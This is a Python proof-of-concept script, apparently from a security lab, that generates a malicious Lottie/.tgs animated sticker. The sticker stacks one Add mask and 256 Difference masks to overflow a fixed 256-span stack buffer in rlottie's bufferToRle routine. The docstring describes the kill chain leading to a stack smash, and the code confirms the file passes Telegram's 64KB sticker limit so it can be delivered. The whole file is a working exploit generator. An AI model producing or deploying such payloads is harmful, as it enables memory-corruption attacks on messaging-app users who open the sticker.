#!/usr/bin/env python3
"""
lab1/gen_poc_v5.py
Generate a Lottie/.tgs sticker that overflows bufferToRle using MULTIPLE
simple rectangle masks instead of one complex polygon.

Key insight: rlottie's FreeType rasterizer has a 1024-vertex limit per polygon.
Solution: use 257 separate masks (1 Add + 256 Difference), each a simple 4-vertex
rectangle. Each Difference mask punches a 1px hole in the coverage. After 255
Difference masks, the accumulated RLE has 256 spans/line. When the 256th
Difference mask is XOR'd, rleOpGeneric's bufferToRle writes 257 spans into
temp[256] — overflowing by 1 span (8 bytes).

For a larger overflow, render to 2048×2048 surface (4x canvas) and use more masks.

Kill chain:
  maskRle() loop: rle = solid ^ rect1 ^ rect2 ^ ... ^ rect256
  Each ^ calls opGeneric → rleOpGeneric → bufferToRle
  After 255 XORs, accumulated RLE = 256 spans/line
  256th XOR: bufferToRle produces 257 spans → temp[256] overflow → stack smash
"""

import argparse
import gzip
import io
import json
import sys


def make_rect_path(x0, y0, x1, y1):
    """4-vertex closed Lottie bezier rectangle."""
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def build_lottie(canvas_w, canvas_h, n_diff_masks, render_scale):
    """
    Build Lottie JSON with 1 Add mask + n_diff_masks Difference masks.

    Each Difference mask is a thin vertical strip that creates a 1px gap
    at the render resolution. After n_diff_masks XOR operations, the
    accumulated RLE has (n_diff_masks + 1) spans per scanline.

    At render_scale=2 (1024px surface), each canvas unit = 2 render pixels.
    A 0.5-unit-wide rect = 1 render pixel.
    """

    def static_path(p):
        return {"a": 0, "k": p}

    def static_val(v):
        return {"a": 0, "k": v}

    # Identity transform (no scaling at layer level — scaling comes from surface size)
    identity_ks = {
        "p": static_val([0, 0, 0]),
        "a": static_val([0, 0, 0]),
        "s": static_val([100, 100, 100]),
        "r": static_val(0),
        "o": static_val(100),
    }

    # Mask 0: Add — solid rectangle covering full canvas
    masks = [
        {
            "mode": "a",
            "inv": False,
            "pt": static_path(make_rect_path(0, 0, canvas_w, canvas_h)),
            "o": static_val(100),
        }
    ]

    # Masks 1..N: Difference — thin vertical strips
    # At render resolution (canvas × render_scale), each strip must be 1px wide.
    # Canvas unit per render pixel = 1 / render_scale.
    # Strip width = 1 / render_scale canvas units.
    strip_w = 1.0 / render_scale  # 0.5 at 2x, 0.25 at 4x

    # Place strips at odd render-pixel positions:
    # render_x = 1, 3, 5, ..., (2*n_diff_masks - 1)
    # canvas_x = render_x / render_scale
    for k in range(n_diff_masks):
        render_x = 2 * k + 1  # odd pixel positions
        cx = render_x / render_scale
        masks.append({
            "mode": "f",   # Difference = XOR
            "inv": False,
            "pt": static_path(make_rect_path(cx, 0, cx + strip_w, canvas_h)),
            "o": static_val(100),
        })

    layer = {
        "ty": 4,
        "nm": "MultiMaskOverflow",
        "ind": 1,
        "st": 0,
        "ip": 0,
        "op": 2,
        "sr": 1,
        "ks": identity_ks,
        "hasMask": True,
        "masksProperties": masks,
        "shapes": [
            {
                "ty": "gr",
                "nm": "G",
                "it": [
                    {
                        "ty": "rc",
                        "nm": "Rect",
                        "p": static_val([canvas_w / 2, canvas_h / 2]),
                        "s": static_val([canvas_w, canvas_h]),
                        "r": static_val(0),
                    },
                    {
                        "ty": "fl",
                        "nm": "Fill",
                        "c": static_val([1, 0, 0, 1]),
                        "o": static_val(100),
                        "r": 1,
                    },
                ],
            }
        ],
    }

    return {
        "v": "5.5.2",
        "fr": 60,
        "ip": 0,
        "op": 2,
        "w": canvas_w,
        "h": canvas_h,
        "nm": "rlottie-overflow-v5",
        "ddd": 0,
        "assets": [],
        "layers": [layer],
    }


def main():
    ap = argparse.ArgumentParser(
        description="Generate rlottie stack-overflow PoC v5 (multi-mask)")
    ap.add_argument("--out", default="poc_v5.tgs", help="Output .tgs path")
    ap.add_argument("--json", default="poc_v5.json", help="Output JSON path")
    ap.add_argument("--masks", type=int, default=256,
                    help="Number of Difference masks (default=256 → 257 spans → overflow by 1)")
    ap.add_argument("--width", type=int, default=512)
    ap.add_argument("--height", type=int, default=512)
    ap.add_argument("--scale", type=int, default=2,
                    help="Render scale factor (surface = canvas × scale)")
    args = ap.parse_args()

    render_w = args.width * args.scale
    total_masks = 1 + args.masks
    expected_spans = args.masks + 1
    overflow_spans = max(0, expected_spans - 256)

    print(f"Canvas:             {args.width} x {args.height}")
    print(f"Render surface:     {render_w} x {args.height * args.scale}")
    print(f"Total masks:        {total_masks} (1 Add + {args.masks} Difference)")
    print(f"Vertices per mask:  4 (well under rasterizer 1024 limit)")
    print(f"Expected spans:     {expected_spans} per scanline")
    print(f"temp[] capacity:    256")
    print(f"Expected overflow:  {overflow_spans} spans = {overflow_spans * 8} bytes")
    print()

    lottie = build_lottie(args.width, args.height, args.masks, args.scale)
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    with open(args.json, "wb") as f:
        f.write(json_bytes)
    print(f"[+] JSON:  {args.json}  ({len(json_bytes):,} bytes)")

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(args.out, "wb") as f:
        f.write(tgs_bytes)
    print(f"[+] TGS:   {args.out}  ({len(tgs_bytes):,} bytes)")

    if len(tgs_bytes) > 64 * 1024:
        print(f"\n[FAIL] TGS size {len(tgs_bytes)} exceeds 64KB Telegram limit!")
    else:
        print(f"\n[ok] Passes Telegram 64KB limit ({len(tgs_bytes)} < 65536 bytes)")


if __name__ == "__main__":
    main()
